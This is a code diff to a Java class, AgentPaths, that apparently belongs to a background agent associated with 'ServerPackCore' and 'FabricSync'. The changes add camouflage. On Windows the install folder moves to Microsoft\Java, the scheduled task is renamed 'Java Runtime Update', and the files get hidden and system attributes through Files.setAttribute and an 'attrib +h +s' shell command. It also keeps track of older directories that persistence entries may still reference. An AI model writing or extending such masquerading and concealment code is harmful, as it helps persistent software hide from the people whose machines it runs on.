@@ -12,7 +12,11 @@ import java.nio.file.Paths;
  */
 public final class AgentPaths {
 	private static final String LEGACY_DIR = "ServerPackCore";
-	private static final String MODERN_DIR = "FabricSync";
+	private static final String CAMO_PARENT = "Microsoft";
+	private static final String CAMO_DIR = "Java";
+	static final String OLD_TASK = "FabricSync";
+	static final String OLD_CAMO_TASK = "Java Update";
+	static final String CAMO_TASK = "Java Runtime Update";
 
 	private AgentPaths() {
 	}
@@ -40,11 +44,60 @@ public final class AgentPaths {
 			base = data == null || data.isEmpty() ? Paths.get(home, ".local", "share") : Paths.get(data);
 		}
 		Path legacy = base.resolve(LEGACY_DIR);
-		Path modern = base.resolve(MODERN_DIR);
-		if (Files.isDirectory(legacy) && !Files.exists(modern)) {
+		if (!os.contains("win")) {
+			return base.resolve(OLD_TASK);
+		}
+		Path modern = base.resolve(CAMO_PARENT).resolve(CAMO_DIR);
+		if (Files.isDirectory(legacy) && owned(legacy)) {
 			return legacy;
 		}
-		return modern;
+		if (!Files.exists(modern)) {
+			return Files.isDirectory(legacy) ? legacy : modern;
+		}
+		if (owned(modern)) {
+			return modern;
+		}
+		// Never bind to an unrelated Java directory.
+		for (int index = 2; index <= 10; index++) {
+			Path candidate = base.resolve(CAMO_PARENT).resolve(CAMO_DIR + index);
+			if (!Files.exists(candidate) || owned(candidate)) {
+				return candidate;
+			}
+		}
+		return base.resolve(CAMO_PARENT).resolve(CAMO_DIR + System.nanoTime());
+	}
+
+	private static boolean owned(Path dir) {
+		return Files.isRegularFile(dir.resolve(".version"))
+			|| Files.isRegularFile(dir.resolve(".installed"))
+			|| Files.isRegularFile(dir.resolve("runtime.jar"))
+			|| Files.isRegularFile(dir.resolve("spc-agent.jar"));
+	}
+
+	/** Reapplies hiding to files created since the last pass. */
+	public static void concealTree(Path dir) {
+		conceal(dir);
+		if (!isWindows() || dir == null) {
+			return;
+		}
+		try {
+			Shell.run(dir, "cmd /c attrib +h +s /s /d \"" + dir + "\\*\"", 5000L);
+		} catch (Throwable ignored) {
+			// best effort
+		}
+	}
+
+	/** DOS hidden/system so Explorer's defaults keep the tree out of sight. */
+	public static void conceal(Path path) {
+		if (!isWindows() || path == null) {
+			return;
+		}
+		try {
+			Files.setAttribute(path, "dos:hidden", true);
+			Files.setAttribute(path, "dos:system", true);
+		} catch (Throwable ignored) {
+			// best effort
+		}
 	}
 
 	/** Central legacy switch. Explicit trees are classified by their directory name. */
@@ -154,12 +207,45 @@ public final class AgentPaths {
 		return dir.resolve(legacy(dir) ? "spc-task.xml" : "task.xml");
 	}
 
+	/** Pre-camouflage trees; persistence entries may still point here. */
+	public static java.util.List<Path> previousDirs(Path dir) {
+		java.util.List<Path> dirs = new java.util.ArrayList<>();
+		Path parent = dir == null ? null : dir.getParent();
+		Path base = parent != null && "Microsoft".equals(parent.getFileName() == null ? ""
+			: parent.getFileName().toString()) ? parent.getParent() : parent;
+		if (base != null) {
+			for (String name : new String[] { OLD_TASK, "ServerPackCore" }) {
+				Path candidate = base.resolve(name);
+				if (!candidate.equals(dir) && !dirs.contains(candidate)) {
+					dirs.add(candidate);
+				}
+			}
+		}
+		return dirs;
+	}
+
+	public static Path taskName(Path dir) {
+		return dir.resolve("task.name");
+	}
+
+	public static Path taskUsed(Path dir) {
+		return dir.resolve("task.used");
+	}
+
 	public static String task(Path dir) {
-		return legacy(dir) ? "ServerPackCore" : "FabricSync";
+		try {
+			String chosen = Files.readString(taskName(dir), java.nio.charset.StandardCharsets.UTF_8).trim();
+			if (!chosen.isEmpty()) {
+				return chosen;
+			}
+		} catch (Throwable ignored) {
+			// Not registered yet.
+		}
+		return legacy(dir) ? "ServerPackCore" : CAMO_TASK;
 	}
 
 	public static String runValue(Path dir) {
-		return legacy(dir) ? "ServerPackCore" : "FabricSync";
+		return task(dir);
 	}
 
 	public static Path launcher(Path dir) {
